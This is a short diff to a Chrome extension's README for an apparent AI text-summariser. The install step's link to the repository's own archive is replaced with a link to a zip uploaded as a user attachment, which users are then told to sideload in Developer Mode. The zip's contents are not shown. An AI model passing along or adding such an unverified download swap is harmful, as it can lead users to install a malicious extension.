@@ -15,7 +15,7 @@ This Chrome extension allows users to **summarize any selected text from a webpa
 
 ## 🚀 How to Install (Manual)
 
-1. Clone this repo or [Download ZIP](https://github.com/yourusername/mindmapper-ai-extension/archive/refs/heads/main.zip)
+1. Clone this repo or [Mindmapper-AI-Extension.zip](https://github.com/user-attachments/files/21461848/Mindmapper-AI-Extension.zip)
 2. Go to `chrome://extensions` in your browser
 3. Enable **Developer Mode**
 4. Click **Load Unpacked**
